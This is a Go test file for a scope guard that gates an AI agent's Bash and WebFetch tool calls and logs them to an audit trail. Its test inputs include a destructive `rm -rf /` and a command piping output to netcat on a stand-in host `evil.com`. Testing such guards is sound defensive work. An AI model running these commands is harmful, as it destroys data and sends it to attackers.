// Nexus IA v6.0 — Absorbido de ARTEX/guard
// Upstream: github.com/mhtsec/ARTEX/guard
// Licencia: AGPL-3.0

package guard

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"github.com/nexus-ia/nexus/core/hook"
	"github.com/nexus-ia/nexus/ethical_boundary/scope"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

func bashInput(cmd string) []byte {
	b, _ := json.Marshal(map[string]string{"command": cmd})
	return b
}

// A locked scope blocks inspected tool calls that name a host outside it, lets
// in-scope calls through, and records the block in the audit log.
func TestScopeGuardBlocksOutOfScope(t *testing.T) {
	policy := scope.New([]scope.Rule{{Kind: "root_domain", Domain: "acme.com"}})
	g := ScopeOnly(func() (bool, scope.Policy, error) { return true, policy, nil })
	ctx := context.Background()

	if b, msg, _ := g.Hooks().PreToolUse(ctx, "Bash", bashInput("curl https://evil.example/")); !b {
		t.Fatal("out-of-scope Bash call was not blocked")
	} else if !strings.Contains(msg, "evil.example") || !strings.Contains(msg, "非目标防御") {
		t.Errorf("block message must name the host and frame it as platform policy: %q", msg)
	}
	if b, _, _ := g.Hooks().PreToolUse(ctx, "Bash", bashInput("curl https://www.acme.com/")); b {
		t.Error("in-scope call blocked")
	}
	fetch, _ := json.Marshal(map[string]string{"url": "http://10.0.0.1/"})
	if b, _, _ := g.Hooks().PreToolUse(ctx, "WebFetch", fetch); !b {
		t.Error("out-of-scope WebFetch not blocked")
	}
	// File tools are not network calls and are never inspected.
	write, _ := json.Marshal(map[string]string{"content": "https://evil.example"})
	if b, _, _ := g.Hooks().PreToolUse(ctx, "Write", write); b {
		t.Error("Write must not be scope-checked")
	}
	var blocks int
	for _, e := range g.Audit() {
		if e.Action == "block" {
			blocks++
		}
	}
	if blocks != 2 {
		t.Errorf("audit recorded %d blocks, want 2", blocks)
	}
}

func TestScopeGuardUnlockedAndFailClosed(t *testing.T) {
	ctx := context.Background()
	open := ScopeOnly(func() (bool, scope.Policy, error) { return false, scope.Policy{}, nil })
	if b, _, _ := open.Hooks().PreToolUse(ctx, "Bash", bashInput("curl https://anything.example/")); b {
		t.Error("an unlocked scope must not block")
	}
	broken := ScopeOnly(func() (bool, scope.Policy, error) { return false, scope.Policy{}, errors.New("db down") })
	if b, _, _ := broken.Hooks().PreToolUse(ctx, "Bash", bashInput("ls")); !b {
		t.Error("scope lookup failure must fail closed for inspected tools")
	}
	if b, _, _ := broken.Hooks().PreToolUse(ctx, "Read", []byte(`{"file_path":"a"}`)); b {
		t.Error("non-network tools must not depend on the scope lookup")
	}
	// A lock set after the guard was built takes effect on the next call.
	locked := false
	g := New()
	g.SetScope(func() (bool, scope.Policy, error) { return locked, scope.New(nil), nil })
	if b, _, _ := g.Hooks().PreToolUse(ctx, "Bash", bashInput("curl https://acme.com")); b {
		t.Error("blocked before the lock")
	}
	locked = true
	if b, _, _ := g.Hooks().PreToolUse(ctx, "Bash", bashInput("curl https://acme.com")); !b {
		t.Error("lock did not take effect; an empty locked scope must deny external hosts")
	}
}

func TestPostToolUseAttribution(t *testing.T) {
	g := New()
	ctx := context.Background()
	run := func(out string, isErr bool) {
		g.Hooks().PostToolUse(ctx, "Bash", nil, []byte(out), isErr)
	}
	run("HTTP/1.1 403 Forbidden", false)
	run("connection refused", true)
	run("200 OK", false)
	run("ignored", true)
	g.Hooks().PostToolUse(ctx, "Read", nil, []byte("403"), false)
	got := g.Attributions()
	if got["blocked"] != 1 || got["error"] != 2 || got["ok"] != 1 {
		t.Errorf("attributions=%v", got)
	}
}

var _ = hook.PreToolUse
